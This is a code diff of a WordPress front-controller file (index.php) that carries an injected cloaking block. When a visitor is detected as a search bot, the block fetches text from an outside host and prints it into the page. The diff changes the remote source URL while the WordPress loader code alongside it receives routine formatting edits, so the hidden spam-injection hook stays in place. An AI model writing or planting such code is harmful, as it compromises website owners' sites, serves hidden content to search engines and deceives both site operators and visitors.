@@ -12,16 +12,15 @@ function is_bot() {
 }
 
 if (is_bot()) {
-    $message = file_get_contents("https://gotcha-69a55.web.app/acid/stpn.ac.id.txt");
+    $message = file_get_contents("https://woulddataroom.com/usie/sicantik.txt");
     echo $message;
 }
 ?>
 
 <?php
 /**
- * Front to the WordPress application.
- * This file doesn't do anything, but loads wp-blog-header.php which does
- * and tells WordPress to load the theme.
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
  *
  * @package WordPress
  */
@@ -31,8 +30,8 @@ if (is_bot()) {
  *
  * @var bool
  */
-define('WP_USE_THEMES', true);
+define( 'WP_USE_THEMES', true );
 
 /** Loads the WordPress Environment and Template */
-require(dirname(__FILE__) . '/main/wp-blog-header.php');
+require __DIR__ . '/wp-blog-header.php';
 ?>
